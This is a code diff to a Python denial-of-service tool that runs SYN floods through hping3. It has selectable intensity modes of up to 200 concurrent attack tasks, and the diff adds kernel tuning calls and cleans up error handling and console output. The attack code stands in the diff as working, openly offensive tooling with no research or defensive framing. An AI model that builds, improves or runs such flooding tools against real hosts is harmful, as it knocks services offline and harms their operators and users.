@@ -4,9 +4,11 @@
 # Simple: 1 task (Light)
 # Base:   50 tasks (Default)
 # Turbo:  200 tasks (Intensive)
+# (This applies to everyone!)
 ###########
 # IMPORTS #
 ###########
+from scripts.platform_utils import find_hping3, apply_kernel_tunings
 from rich.console import Console
 import asyncio
 import subprocess
@@ -14,7 +16,6 @@ import sys
 import time
 import os
 import threading
-import shutil
 
 ############
 # PRE-DEFS #
@@ -37,10 +38,10 @@ try:
     modebort = console.input("[yellow] Do you want Simple mode (s) or Base mode (b) or Turbo mode (t)?[/yellow] ")
     modebort = modebort.strip().lower()
     if modebort in ["t", "turbo"]:
-        console.print("[yellow] Okay, at your own risk.[yellow]")
+        console.print("[yellow] Okay, at your own risk.[/yellow]")
         NUM_TASKS = 200
     elif modebort in ["b", "base"]:
-        console.print("[yellow] Alright, moving on with base mode.[yellow]")
+        console.print("[yellow] Alright, moving on with base mode.[/yellow]")
         NUM_TASKS = 50
     else:
         console.print("[yellow] Moving forward with Simple mode.[/yellow]")
@@ -49,25 +50,8 @@ except KeyboardInterrupt:
     console.print("[red] Canceled by user.[/red]")
     sys.exit(2)
 except Exception as e:
-    console.print("[red] Error: {e}[/red]")
+    console.print(f"[red] Error: {e}[/red]")
     sys.exit(1)
-    
-
-###############
-# VERIFICAÇÃO #
-###############
-def find_hping3():
-    hping3_path = shutil.which("hping3")
-    if hping3_path is None:
-        possible_paths = ["/usr/sbin/hping3", "/usr/bin/hping3", "/sbin/hping3"]
-        for path in possible_paths:
-            if os.path.exists(path) and os.access(path, os.X_OK):
-                hping3_path = path
-                break
-    if hping3_path is None:
-        print("[!] hping3 not found. Install it and try again.")
-        sys.exit(1)
-    return hping3_path
 
 ###############
 # ATTACK TASK #
@@ -85,8 +69,6 @@ async def syn_flood_task(host, port, hping3_path):
             processes.append(proc)
         await proc.wait()
     except asyncio.CancelledError:
-        return
-    except KeyboardInterrupt:
         return
     except Exception:
         return
@@ -129,7 +111,7 @@ async def main_attack(host, port):
             for proc in processes:
                 try:
                     proc.terminate()
-                except:
+                except Exception:
                     pass
         thread.join(timeout=1)
         sys.exit(0)
@@ -138,10 +120,11 @@ async def main_attack(host, port):
 # RUNNER #
 ##########
 def run(host, port):
+    apply_kernel_tunings()
     print(f"[DEBUG] SYN Flood attack started for {host}:{port} (hping3)")
+    apply_kernel_tunings()
     try:
         asyncio.run(main_attack(host, port))
     except KeyboardInterrupt:
         print("\n[!] Interrupted by user.")
         sys.exit(0)
-
